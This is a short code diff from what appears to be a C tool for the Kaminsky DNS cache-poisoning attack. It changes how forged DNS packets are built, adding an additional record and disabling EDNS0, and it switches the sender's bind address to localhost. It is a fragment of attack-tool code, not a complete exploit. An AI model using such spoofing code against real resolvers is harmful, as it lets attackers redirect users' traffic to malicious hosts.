@@ -85,7 +85,8 @@ bool make_kaminsky_packets(packet_queue_t* queue, void* args) {
                                      query, 1,           // 1 Question
                                      NULL, 0,            // 0 Answers
                                      authori, 1,         // 1 Authority RR
-                                     TRUE);              // Enables EDNS0
+                                     additional, 1,
+                                     FALSE);              // Enables EDNS0
 
     uint8_t* packet_template = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
     size_t packet_raw_len = make_udp_packet(packet_template, DNS_PKT_MAX_LEN,
@@ -259,7 +260,7 @@ int main(int argc, char** argv) {
 
     // 初始化 sender 框架
     sender_t my_sender;
-    if (sender_init(&my_sender, loop, "0.0.0.0", 0) != 0) {
+    if (sender_init(&my_sender, loop, "127.0.0.1", 0) != 0) {
         fprintf(stderr, "Failed to initialize sender\n");
         return 1;
     }
